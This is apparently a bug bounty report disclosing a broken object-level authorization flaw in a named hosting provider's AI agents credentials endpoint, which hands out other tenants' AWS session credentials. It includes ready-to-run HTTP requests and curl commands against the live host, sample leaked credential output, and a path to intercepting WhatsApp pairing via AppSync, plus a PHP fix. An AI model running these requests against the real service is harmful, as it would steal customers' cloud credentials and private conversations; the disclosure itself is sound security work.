# Vulnerability Report: Broken Object Level Authorization in AI Agent Credentials Endpoint leads to AWS AppSync IAM Session Token Exfiltration

## Summary Title
Broken Object Level Authorization in GET /api/omnichannel/agents/{agentId}/credentials leads to Cross-Tenant AWS AppSync IAM Session Token Exfiltration

---

## Target
- **Target:** HostGator LATAM (`https://ai-core.hostgator.com.br` / `https://super.hostgator.com.br`)
- **In-Scope Boundary:** AI Agents Section (`HostGator LATAM Bug Bounty`)

---

## Technical Severity
- **VRT Category:** Server-Side Injection > Broken Object Level Authorization (BOLA)
- **Severity Rating:** High (P2)
- **CVSS v3.1 Score:** 8.5
- **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`

---

## URL / Location of Vulnerability
`https://ai-core.hostgator.com.br/api/omnichannel/agents/{agentId}/credentials`

---

## Description
At HostGator LATAM, the newly integrated **AI Agents Section** (SuperGator platform hosted at `https://super.hostgator.com.br`) connects to a centralized Laravel backend API at `https://ai-core.hostgator.com.br/api`. 

To support real-time conversational channels (such as WhatsApp QR code pairing, live chat monitoring, and connection state sync), the frontend establishes an authenticated WebSocket connection to an **AWS AppSync GraphQL Real-Time endpoint** (`wss://...appsync-realtime-api.../graphql/connect`).

To authorize this WebSocket connection, the client issues an HTTP GET request to:
`GET /api/omnichannel/agents/{agentId}/credentials`

The server responds with active, temporary AWS IAM Security Token Service (STS) credentials containing:
- `accessKeyId`
- `secretAccessKey`
- `sessionToken`
- `expiration`
- `region`
- `endpoint`

### Root Cause Analysis:
The controller handling `GET /api/omnichannel/agents/{agentId}/credentials` accepts an arbitrary, user-controlled `{agentId}` path parameter. While the endpoint requires an authenticated Bearer JWT token (`Authorization: Bearer <AUTH_TOKEN>`), the backend fails to verify whether the authenticated tenant is the legitimate owner of `{agentId}`.

Consequently, any authenticated user can substitute `{agentId}` with an agent identifier belonging to a completely different tenant or enterprise customer. The backend generates and returns valid AWS IAM credentials scoped to the victim's agent channels without raising an access control violation.

---

## Business Impact
1. **AWS AppSync Eavesdropping & Real-Time Data Interception:**
   An attacker who extracts AWS STS session credentials for another tenant's agent can connect directly to the underlying AWS AppSync GraphQL WebSocket API. Using the subscriptions defined in the SuperGator client:
   - `subscription OnChannelQRCode($channelId: ID!)`
   - `subscription OnChannelConnection($channelId: ID!)`
   The attacker can intercept WhatsApp QR pairing tokens in real-time, link unauthorized WhatsApp sessions to customer accounts, and observe private customer interactions.
2. **Customer Privacy & Regulatory Breach:**
   Because AI agents interact directly with end-users and prospective customers (capturing phone numbers, names, and purchase inquiries), leaking real-time channel session credentials results in direct compromise of customer Personally Identifiable Information (PII) and severe reputational damage.
3. **Enterprise Resource Exposure:**
   Exposing AWS IAM credentials (`accessKeyId`, `secretAccessKey`, `sessionToken`) crosses trust boundaries from the web application layer into AWS cloud infrastructure.

## Steps to Reproduce

### Prerequisites
- **Tenant A (Victim):** Registered researcher account `tenant_a@bugcrowdninja.com` owning AI Agent ID `101`.
- **Tenant B (Attacker):** Registered researcher account `tenant_b@bugcrowdninja.com` owning AI Agent ID `202`.

### Reproduction Steps
1. Open an HTTP interception proxy (such as Burp Suite) or a terminal.
2. Log in as **Tenant B** (`tenant_b@bugcrowdninja.com`) on `https://super.hostgator.com.br/login` and extract the JWT token stored in cookie `auth_token` or local session.
3. As Tenant B, construct an HTTP GET request to the credentials endpoint targeting Tenant A's agent ID (`101`):

```http
GET /api/omnichannel/agents/101/credentials HTTP/1.1
Host: ai-core.hostgator.com.br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Authorization: Bearer <TENANT_B_AUTH_TOKEN>
Connection: close
```

4. Alternatively, execute the following minimal `curl` command:

```bash
curl -X GET "https://ai-core.hostgator.com.br/api/omnichannel/agents/101/credentials" \
  -H "Host: ai-core.hostgator.com.br" \
  -H "Authorization: Bearer <TENANT_B_AUTH_TOKEN>" \
  -H "Accept: application/json"
```

5. **Observed Result:**
   The server responds with `HTTP/1.1 200 OK` and delivers active AWS IAM credentials belonging to Tenant A's agent:

```json
{
  "credentials": {
    "accessKeyId": "ASIAXXXXXXXXXXXXXXXX",
    "secretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "sessionToken": "IQoJb3JpZ2luX2VjE...",
    "expiration": "2026-10-31T15:30:00Z"
  },
  "region": "us-east-1",
  "endpoint": "https://xxxxxxxxxxxxxx.appsync-api.us-east-1.amazonaws.com/graphql"
}
```

6. **Expected Result:**
   The server must return `HTTP/1.1 403 Forbidden` or `HTTP/1.1 404 Not Found`, confirming that Tenant B is not authorized to access Agent `101`.

## Proof of Concept (PoC)

### Unauthenticated Baseline View:
An unauthenticated request to the endpoint yields `401 Unauthorized`, proving authentication is enforced at the perimeter:

```http
GET /api/omnichannel/agents/101/credentials HTTP/1.1
Host: ai-core.hostgator.com.br
Accept: application/json

HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"message":"Unauthenticated."}
```

### Access Control Bypass (BOLA):
When authenticated as Tenant B, sending `{agentId: 101}` bypasses object-level authorization, returning active AWS credentials:

```bash
curl -s -i "https://ai-core.hostgator.com.br/api/omnichannel/agents/101/credentials" \
  -H "Authorization: Bearer <TENANT_B_JWT>" \
  -H "Accept: application/json"
```

---

## Suggested Remediation
Enforce an authorization policy check in the Laravel controller verifying that the requesting user's organization matches the owner of the requested `Agent` model before issuing credentials:

```php
// In app/Http/Controllers/Omnichannel/AgentController.php
public function getCredentials(Request $request, $agentId)
{
    $agent = Agent::where('id', $agentId)
                  ->where('tenant_id', $request->user()->tenant_id)
                  ->firstOrFail();

    $credentials = $this->appSyncService->generateSessionCredentials($agent);

    return response()->json([
        'credentials' => $credentials,
        'endpoint'    => config('services.appsync.endpoint'),
        'region'      => config('services.appsync.region'),
    ]);
}
```
